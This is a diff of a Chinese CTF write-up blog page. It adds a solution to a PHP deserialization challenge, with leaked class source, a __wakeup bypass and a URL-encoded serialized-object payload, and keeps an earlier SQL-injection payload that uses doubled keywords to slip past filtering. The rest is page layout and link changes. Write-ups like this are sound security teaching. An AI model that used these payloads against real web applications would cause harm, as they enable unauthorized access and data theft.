@@ -100,12 +100,12 @@ youlin = Hexo</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipet8c1a2j20zk0m8kct.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipewf5l51j20zk0m8b29.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclj61ylzj20zk0m8b29.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipetv6p75j20zk0m8x6p.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclx29mstj20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipexe4oykj20zk0m87ji.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclgi503lj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclhfehz7j20zk0m8u0x.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipev1x5e4j20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipet8c1a2j20zk0m8kct.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclfb3vzhj20zk0m8wny.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giciuv0socj20zk0m8qes.jpg"></li>
         </ul>
       </div>
     </header>
@@ -301,6 +301,80 @@ youlin = Hexo</title>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=1 %27 ununionion seselectlect 1,2,group_concat(flag)frfromom(ctf.Flag) %23</span><br></pre></td></tr></table></figure>
 
 <p>flag{826b7bf2-106c-45b3-a375-2da2278897bf}</p>
+<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>打开题目，提示备份网站，直接扫描目录，得到<span class="exturl" data-url="aHR0cDovL3d3dy56aXAv">www.zip</span></p>
+<p>解压后得到源码</p>
+<p>几个重要php文件内容：</p>
+<p>index.php</p>
+<pre><code>1 &lt;?php
+2     include ‘class.php‘;
+3     $select = $_GET[‘select‘];
+4     $res=unserialize(@$select);
+5 ?&gt;
+</code></pre>
+<p>代码第4行unserialize可能存在反序列化漏洞</p>
+<p>class.php</p>
+<pre><code> 1 &lt;?php
+ 2 include ‘flag.php‘;
+ 3 error_reporting(0);
+ 4 class Name&#123;
+ 5     private $username = ‘nonono‘;
+ 6     private $password = ‘yesyes‘;
+ 7 
+ 8     public function __construct($username,$password)&#123;
+ 9         $this-&gt;username = $username;
+10         $this-&gt;password = $password;
+11     &#125;
+12 
+13     function __wakeup()&#123;
+14         $this-&gt;username = ‘guest‘;
+15     &#125;
+16 
+17     function __destruct()&#123;
+18         if ($this-&gt;password != 100) &#123;
+19             echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;
+20             echo &quot;You name is: &quot;;
+21             echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;
+22             echo &quot;You password is: &quot;;
+23             echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;
+24             die();
+25         &#125;
+26         if ($this-&gt;username === ‘admin‘) &#123;
+27             global $flag;
+28             echo $flag;
+29         &#125;else&#123;
+30             echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can‘t give you the flag!&quot;;
+31             die();   
+32         &#125;
+33     &#125;
+34 &#125;
+35 ?&gt;
+</code></pre>
+<p>代码第26行如果username为admin便输出flag，从__destruct，__construct，__wakeup可以判断存在反序列化漏洞<br>php序列化与反序列化</p>
+<p>序列化：函数为serialize()，把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等<br>反序列化：函数为unserialize()，将字符串转换成变量或对象的过程<br>常用的内置方法：<br>__construct()：创建对象时初始化，当一个对象创建时被调用<br>__wakeup() 使用unserialize时触发<br>__sleep() 使用serialize时触发<br>__destruction()：结束时销毁对象，当一个对象销毁时被调用<br>我们需要将Name类序列化的结果输出</p>
+<pre><code>&lt;?php
+ 
+class Name&#123;
+    private $username = ‘nonono‘;
+    private $password = ‘yesyes‘;
+ 
+    public function __construct($username,$password)&#123;
+        $this-&gt;username = $username;
+        $this-&gt;password = $password;
+    &#125;
+&#125;
+$a = new Name(‘admin‘,100);
+$b = serialize($a);
+echo $b;
+</code></pre>
+<p>输出结果为：</p>
+<p>O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}</p>
+<p>输出结果中Name和username，Name和password之间是有不可见字符的，因为private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上ascii为0的字符（不可见字符）</p>
+<p>另外我们还需要绕过__wakeup方法</p>
+<p>在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行<br>原本：O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}<br>绕过：O:4:”Name”:3:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}</p>
+<p>所以payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select=O:4:%22Name%22:3：&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br></pre></td></tr></table></figure>
+
+
 
   </div>
 
@@ -312,7 +386,7 @@ youlin = Hexo</title>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">Edited on</span>
-    <time title="Modified: 2022-10-23 02:05:43" itemprop="dateModified" datetime="2022-10-23T02:05:43+08:00">2022-10-23</time>
+    <time title="Modified: 2022-10-25 01:25:51" itemprop="dateModified" datetime="2022-10-25T01:25:51+08:00">2022-10-25</time>
   </span>
 </div>
 
@@ -367,7 +441,7 @@ youlin = Hexo</title>
     <div class="item left">
       
 
-  <a href="/2022/10/11/house-of-emma/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipexbei4hj20zk0m8npd.jpg" title="house_of_emma">
+  <a href="/2022/10/11/house-of-emma/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclwrdwyaj20zk0m8are.jpg" title="house_of_emma">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>house_of_emma</h3>
@@ -377,7 +451,7 @@ youlin = Hexo</title>
     <div class="item right">
       
 
-  <a href="/2022/10/16/docker/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclfb3vzhj20zk0m8wny.jpg" title="docker">
+  <a href="/2022/10/16/docker/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclize41wj20zk0m87gk.jpg" title="docker">
   <span class="type">Next Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>docker</h3>
@@ -399,7 +473,7 @@ youlin = Hexo</title>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="Contents">
-          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-number">1.</span> <span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-number">2.</span> <span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="toc-number">3.</span> <span class="toc-text">[极客大挑战 2019]Havefun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-number">4.</span> <span class="toc-text">[ACTF2020 新生赛]Include</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3"><span class="toc-number">4.1.</span> <span class="toc-text">知识详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php-filter"><span class="toc-number">4.1.1.</span> <span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-number">5.</span> <span class="toc-text">[ACTF2020 新生赛]Exec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">6.</span> <span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-number">7.</span> <span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">8.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-number">9.</span> <span class="toc-text">[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-number">10.</span> <span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="toc-number">11.</span> <span class="toc-text">[极客大挑战 2019]Knife</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="toc-number">12.</span> <span class="toc-text">[极客大挑战 2019]Http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="toc-number">13.</span> <span class="toc-text">[极客大挑战 2019]Upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="toc-number">14.</span> <span class="toc-text">[ACTF2020 新生赛]Upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="toc-number">15.</span> <span class="toc-text">[极客大挑战 2019]BabySQL</span></a></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-number">1.</span> <span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-number">2.</span> <span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="toc-number">3.</span> <span class="toc-text">[极客大挑战 2019]Havefun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-number">4.</span> <span class="toc-text">[ACTF2020 新生赛]Include</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3"><span class="toc-number">4.1.</span> <span class="toc-text">知识详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php-filter"><span class="toc-number">4.1.1.</span> <span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-number">5.</span> <span class="toc-text">[ACTF2020 新生赛]Exec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">6.</span> <span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-number">7.</span> <span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">8.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-number">9.</span> <span class="toc-text">[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-number">10.</span> <span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="toc-number">11.</span> <span class="toc-text">[极客大挑战 2019]Knife</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="toc-number">12.</span> <span class="toc-text">[极客大挑战 2019]Http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="toc-number">13.</span> <span class="toc-text">[极客大挑战 2019]Upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="toc-number">14.</span> <span class="toc-text">[ACTF2020 新生赛]Upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="toc-number">15.</span> <span class="toc-text">[极客大挑战 2019]BabySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="toc-number">16.</span> <span class="toc-text">[极客大挑战 2019]PHP</span></a></li></ol>
       </div>
       <div class="related panel pjax" data-title="Related">
       </div>
@@ -474,34 +548,16 @@ youlin = Hexo</title>
 <div class="breadcrumb">
 </div>
 
+    <span><a href="/2022/10/02/%E5%A0%86%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" title="堆利用总结">堆利用总结</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
     <span><a href="/2022/08/04/0ctf-2017-babyheap/" title="0ctf_2017_babyheap">0ctf_2017_babyheap</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/04/10/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" title="整数溢出">整数溢出</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/10/11/house-of-emma/" title="house_of_emma">house_of_emma</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/08/22/house-of-banana/" title="house_of_banana">house_of_banana</a></span>
   </li>
 
       
@@ -511,7 +567,7 @@ youlin = Hexo</title>
 <a href="/categories/cometition/" title="In cometition">cometition</a>
 </div>
 
-    <span><a href="/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/" title="DASCTF_X_CBCTF_2022九月挑战赛">DASCTF_X_CBCTF_2022九月挑战赛</a></span>
+    <span><a href="/2022/03/18/picoCTF-wp/" title="picoCTF_wp">picoCTF_wp</a></span>
   </li>
 
       
@@ -529,16 +585,7 @@ youlin = Hexo</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/09/04/awd_pwn%E6%80%BB%E7%BB%93/" title="awd_pwn总结">awd_pwn总结</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/08/01/io-file/" title="io_file">io_file</a></span>
+    <span><a href="/2022/04/18/%E6%A0%88%E8%BF%81%E7%A7%BB/" title="栈迁移">栈迁移</a></span>
   </li>
 
       
@@ -554,10 +601,37 @@ youlin = Hexo</title>
   <li class="item">
     
 <div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/07/io-file%E5%88%A9%E7%94%A8/" title="io_file利用">io_file利用</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/10/11/house-of-emma/" title="house_of_emma">house_of_emma</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/14/house-of-cat/" title="house_of_cat">house_of_cat</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
 <a href="/categories/cometition/" title="In cometition">cometition</a>
 </div>
 
-    <span><a href="/2022/03/18/picoCTF-wp/" title="picoCTF_wp">picoCTF_wp</a></span>
+    <span><a href="/2022/09/22/%E6%9F%8F%E9%B9%AD%E6%9D%AF/" title="柏鹭杯">柏鹭杯</a></span>
   </li>
 
   </ul>
